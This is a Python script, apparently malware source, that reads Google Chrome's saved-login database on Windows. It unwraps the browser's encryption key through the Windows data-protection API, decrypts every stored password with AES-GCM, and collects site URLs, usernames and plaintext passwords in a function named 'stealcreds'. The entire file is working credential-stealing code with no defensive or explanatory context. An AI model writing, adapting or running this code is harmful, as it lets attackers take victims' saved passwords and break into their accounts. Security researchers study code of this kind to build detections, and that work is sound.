from datetime import timezone, datetime, timedelta
import os
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import sqlite3

def my_chrome_datetime(timeInMiliSeconds):
    return datetime(1601, 1, 1) + timedelta(microseconds=timeInMiliSeconds)

def encryption_key():
    localStatePath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(localStatePath, "r", encoding="utf-8") as file:
        localStateFile = file.read()
        localStateFile = json.loads(localStateFile)
    ASEkey = base64.b64decode(localStateFile["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(ASEkey, None, None, None, 0)[1]

def decrypt_password(encPass, key):
    try:
        initVector = encPass[3:15]
        encPass = encPass[15:]
        cipher = AES.new(key, AES.MODE_GCM, initVector)
        return cipher.decrypt(encPass)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(encPass, None, None, None, 0)[1])
        except:
            return "No Passwords(logged in with Social Account)"
        
def stealcreds():
    passwordDbPath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    shutil.copyfile(passwordDbPath, "my_chrome_data.db")
    db = sqlite3.connect("my_chrome_data.db")
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
    encpKey = encryption_key()
    data = {}
    for row in cursor.fetchall():
        siteUrl = row[0]
        userName = row[1]
        password = decrypt_password(row[2], encpKey)
        dateCreated = row[3]
        if userName or password:
            data[siteUrl] = []
            data[siteUrl].append({
                "username": userName,
                "password": password,
                "date_created": str(my_chrome_datetime(dateCreated))
            })
        else:
            continue
    cursor.close()
    db.close()
    os.remove("my_chrome_data.db")
    return data
    